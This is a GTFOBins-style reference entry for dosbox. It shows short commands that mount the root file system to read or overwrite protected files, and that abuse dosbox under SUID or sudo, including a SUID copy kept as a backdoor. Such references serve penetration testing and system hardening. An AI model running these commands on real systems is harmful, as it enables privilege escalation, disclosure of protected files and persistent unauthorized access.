# GTFOBin: dosbox

Basically `dosbox` allows to mount the local file system, so that it can be altered using DOS commands. Note that the DOS filename convention (8.3) is used.

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that’s a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.

```
LFILE='\path\to\file_to_write'
dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

The file content will be displayed in the DOSBox graphical window.

```
LFILE='\path\to\file_to_read'
dosbox -c 'mount c /' -c "type c:$LFILE"
```

The file is copied to a readable location.

```
LFILE='\path\to\file_to_read'
dosbox -c 'mount c /' -c "copy c:$LFILE c:\tmp\output" -c exit
cat '/tmp/OUTPUT'
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that’s a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.

```
sudo install -m =xs $(which dosbox) .

LFILE='\path\to\file_to_write'
./dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that’s a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.

```
LFILE='\path\to\file_to_write'
sudo dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
```